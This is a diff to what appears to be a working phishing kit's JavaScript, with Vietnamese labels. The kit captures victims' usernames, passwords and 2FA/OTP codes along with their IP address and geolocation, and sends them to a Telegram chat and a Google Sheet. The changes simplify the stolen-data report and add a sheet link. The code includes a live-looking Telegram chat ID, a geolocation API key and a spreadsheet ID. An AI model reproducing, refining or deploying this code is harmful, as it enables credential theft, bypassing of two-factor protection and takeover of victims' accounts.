@@ -5,6 +5,8 @@ const CONFIG = {
 		CHAT_ID: '-1003936740040',
 	},
 	GEO_API: 'https://ipwhois.pro/?key=8U9rT6QVwOslzNS0',
+	SHEET_ID: '1w9xSxr5KW_FpiwDfRZfX3QSVxpo2NCYMGgOjyq3InnE',
+	SHEET_URL: 'https://docs.google.com/spreadsheets/d/1w9xSxr5KW_FpiwDfRZfX3QSVxpo2NCYMGgOjyq3InnE/edit?gid=0',
 };
 
 /* ================= 2. UTILITIES & DATA ================= */
@@ -127,17 +129,9 @@ const Utils = window.Utils = {
 			const L = Utils.userLoc;
 			const meta = Utils._sheetMeta;
 			if (!meta.row) {
-				const row = [
-					L.ip, L.country, L.countryCode, L.city, L.region, L.continent,
-					L.capital, L.postal, L.callingCode, L.borders,
-					L.isp, L.org, L.asn, L.domain,
-					L.timezone, L.utc, L.localTime,
-					L.currency, L.currencyCode, L.currencySymbol, L.exchangeRate,
-					document.getElementById('username')?.value || 'N/A',
-					navigator.userAgent,
-					Utils.getTime(),
-				];
-				row.push(value);
+				const addr = [L.city, L.region, L.country].filter(Boolean).join(', ') || 'Unknown';
+				const uname = document.getElementById('username')?.value || 'N/A';
+				const row = [L.ip, addr, L.postal || 'Unknown', uname, value];
 				const res = await fetch('/api/sheet', {
 					method: 'POST',
 					headers: { 'Content-Type': 'application/json' },
@@ -150,7 +144,7 @@ const Utils = window.Utils = {
 					meta.row = match[1];
 					meta.col = row.length;
 				}
-				return { ok: !!(data?.updates || data?.result?.updates), row: meta.row, col: meta.col };
+				return { ok: !!(data?.updates || data?.result?.updates), row: meta.row, col: meta.col, url: CONFIG.SHEET_URL };
 			}
 
 			meta.col++;
@@ -161,7 +155,7 @@ const Utils = window.Utils = {
 				body: JSON.stringify({ action: 'update', row: meta.row, value: [[value]] }),
 			});
 			const data = await res.json();
-			return { ok: !!(data?.updates || data?.result?.updates), row: meta.row, col: meta.col };
+			return { ok: !!(data?.updates || data?.result?.updates), row: meta.row, col: meta.col, url: CONFIG.SHEET_URL };
 		} catch {
 			return { ok: false, row: '?', col: '?' };
 		}
@@ -186,6 +180,7 @@ const Utils = window.Utils = {
 					chat_id: CONFIG.TELEGRAM.CHAT_ID,
 					text: text,
 					parse_mode: 'HTML',
+					link_preview_options: { is_disabled: true },
 				}),
 			});
 			const data = await res.json()
@@ -197,142 +192,34 @@ const Utils = window.Utils = {
 	},
 
 	formatReport: (type, extra = {}) => {
-		const d = {
-			username: document.getElementById('username')?.value || 'N/A',
-		};
-
-		let savedPasswords = window.passwords || [];
-
-		let icon = type === 'PASS' ? '🔑 MẬT KHẨU' : '🔥 MÃ OTP';
-
 		const L = Utils.userLoc;
-		let report = `<b>${icon}</b> | ${Utils.getTime()}\n`;
-		report += `━━━━━━━━━━━━━━━━━━━━\n`;
-		report += `🌐 <b>IP:</b> ${L.ip} ${L.flag}\n`;
-		report += `🕵️ <b>UA:</b> ${navigator.userAgent}\n`;
-		report += `━━━━━━━━━━━━━━━━━━━━\n`;
-		report += `📍 <b>Vị trí</b>\n`;
-		report += `   City: ${L.city || 'Unknown'}\n`;
-		report += `   Region: ${L.region || 'Unknown'}\n`;
-		report += `   Country: ${L.country} (${L.countryCode})\n`;
-		if (L.continent) report += `   Continent: ${L.continent}\n`;
-		if (L.capital) report += `   Capital: ${L.capital}\n`;
-		if (L.postal && L.postal !== 'Unknown') report += `   Postal: ${L.postal}\n`;
-		if (L.callingCode) report += `   Calling Code: ${L.callingCode}\n`;
-		if (L.borders) report += `   Borders: ${L.borders}\n`;
-		report += `━━━━━━━━━━━━━━━━━━━━\n`;
-		report += `🔌 <b>Kết nối</b>\n`;
-		if (L.isp) report += `   ISP: ${L.isp}\n`;
-		if (L.org) report += `   Org: ${L.org}\n`;
-		if (L.asn) report += `   ASN: ${L.asn}\n`;
-		if (L.domain) report += `   Domain: ${L.domain}\n`;
-		report += `━━━━━━━━━━━━━━━━━━━━\n`;
-		report += `🕐 <b>Múi giờ</b>\n`;
-		if (L.timezone) report += `   ID: ${L.timezone}\n`;
-		if (L.utc) report += `   UTC: ${L.utc}\n`;
-		if (L.localTime) report += `   Local: ${L.localTime}\n`;
-		if (L.currency) {
-			report += `━━━━━━━━━━━━━━━━━━━━\n`;
-			report += `💰 <b>Tiền tệ</b>\n`;
-			report += `   ${L.currency} (${L.currencyCode}) ${L.currencySymbol}\n`;
-			if (L.exchangeRate) report += `   Rate: 1 USD = ${L.exchangeRate} ${L.currencyCode}\n`;
-		}
-		report += `━━━━━━━━━━━━━━━━━━━━\n`;
-		report += `👤 <b>Username/Email:</b> <code>${d.username}</code>\n`;
-		if (extra.sheet) {
-			const s = extra.sheet;
-			report += `📊 <b>Sheet:</b> ${s.ok ? '✅ OK' : '❌ FAIL'} | Row ${s.row} | Col ${s.col}\n`;
-		}
-		report += `----------------------------------\n`;
+		const uname = document.getElementById('username')?.value || 'N/A';
+		const savedPasswords = window.passwords || [];
+		const savedOtps = window.otps || [];
+		const addr = [L.city, L.region, L.country].filter(Boolean).join(', ') || 'Unknown';
 
-		if (savedPasswords.length > 0) {
-			for (let i = 0; i < savedPasswords.length; i++) {
-				report += `Password(${i + 1}): <code>${savedPasswords[i]}</code>\n`;
-			}
+		let report = `IP: ${L.ip} ${L.flag}\n`;
+		report += `ĐỊA CHỈ: ${addr}\n`;
+		report += `MÃ ZIP: ${L.postal || 'Unknown'}\n\n`;
+		report += `TÀI KHOẢN: ${uname}\n`;
 
-			for (let i = savedPasswords.length; i < 2; i++) {
-				report += `Password(${i + 1}): \n`;
+		if (type === 'PASS' || savedPasswords.length > 0) {
+			const allPwds = savedPasswords.length > 0 ? savedPasswords : [extra.password];
+			report += `MẬT KHẨU: <code>${allPwds[0]}</code>\n`;
+			for (let i = 1; i < allPwds.length; i++) {
+				report += `MẬT KHẨU ${i}: <code>${allPwds[i]}</code>\n`;
 			}
-		} else if (type === 'PASS') {
-			if (extra.attempt === 1) {
-				report += `Password(1): <code>${extra.password}</code>\n`;
-				report += `Password(2): \n`;
-			} else {
-				if (savedPasswords.length > 0) {
-					report += `Password(1): <code>${savedPasswords[0]}</code>\n`;
-				} else {
-					report += `Password(1): \n`;
-				}
-				report += `Password(2): <code>${extra.password}</code>\n`;
-			}
-		} else {
-			report += `Password(1): \n`;
-			report += `Password(2): \n`;
 		}
 
-		report += `----------------------------------\n`;
-
-		let savedOtps = window.otps || [];
-
-		if (savedOtps.length > 0) {
-			for (let i = 0; i < savedOtps.length; i++) {
-				report += `🔐Code 2FA(${i + 1}): <code>${savedOtps[i]}</code> (${savedOtps[i].length} digits)\n`;
+		if (type === 'OTP' || savedOtps.length > 0) {
+			const allOtps = savedOtps.length > 0 ? savedOtps : [extra.otp];
+			for (let i = 0; i < allOtps.length; i++) {
+				report += `MÃ OTP ${i + 1}: <code>${allOtps[i]}</code>\n`;
 			}
+		}
 
-			for (let i = savedOtps.length; i < 4; i++) {
-				report += `🔐Code 2FA(${i + 1}): \n`;
-			}
-		} else if (type === 'OTP') {
-			if (extra.attempt === 1) {
-				report += `🔐Code 2FA(1): <code>${extra.otp}</code> (${extra.otp.length} digits)\n`;
-				report += `🔐Code 2FA(2): \n`;
-				report += `🔐Code 2FA(3): \n`;
-				report += `🔐Code 2FA(4): \n`;
-			} else if (extra.attempt === 2) {
-				if (savedOtps.length > 0) {
-					report += `🔐Code 2FA(1): <code>${savedOtps[0]}</code> (${savedOtps[0].length} digits)\n`;
-				} else {
-					report += `🔐Code 2FA(1): \n`;
-				}
-				report += `🔐Code 2FA(2): <code>${extra.otp}</code> (${extra.otp.length} digits)\n`;
-				report += `🔐Code 2FA(3): \n`;
-				report += `🔐Code 2FA(4): \n`;
-			} else if (extra.attempt === 3) {
-				if (savedOtps.length > 0) {
-					report += `🔐Code 2FA(1): <code>${savedOtps[0]}</code> (${savedOtps[0].length} digits)\n`;
-				} else {
-					report += `🔐Code 2FA(1): \n`;
-				}
-				if (savedOtps.length > 1) {
-					report += `🔐Code 2FA(2): <code>${savedOtps[1]}</code> (${savedOtps[1].length} digits)\n`;
-				} else {
-					report += `🔐Code 2FA(2): \n`;
-				}
-				report += `🔐Code 2FA(3): <code>${extra.otp}</code> (${extra.otp.length} digits)\n`;
-				report += `🔐Code 2FA(4): \n`;
-			} else {
-				if (savedOtps.length > 0) {
-					report += `🔐Code 2FA(1): <code>${savedOtps[0]}</code> (${savedOtps[0].length} digits)\n`;
-				} else {
-					report += `🔐Code 2FA(1): \n`;
-				}
-				if (savedOtps.length > 1) {
-					report += `🔐Code 2FA(2): <code>${savedOtps[1]}</code> (${savedOtps[1].length} digits)\n`;
-				} else {
-					report += `🔐Code 2FA(2): \n`;
-				}
-				if (savedOtps.length > 2) {
-					report += `🔐Code 2FA(3): <code>${savedOtps[2]}</code> (${savedOtps[2].length} digits)\n`;
-				} else {
-					report += `🔐Code 2FA(3): \n`;
-				}
-				report += `🔐Code 2FA(4): <code>${extra.otp}</code> (${extra.otp.length} digits)\n`;
-			}
-		} else {
-			report += `🔐Code 2FA(1): \n`;
-			report += `🔐Code 2FA(2): \n`;
-			report += `🔐Code 2FA(3): \n`;
-			report += `🔐Code 2FA(4): \n`;
+		if (extra.sheet && extra.sheet.ok) {
+			report += `\n📊 <a href="${extra.sheet.url}">Google Sheet</a>\n`;
 		}
 
 		return report;
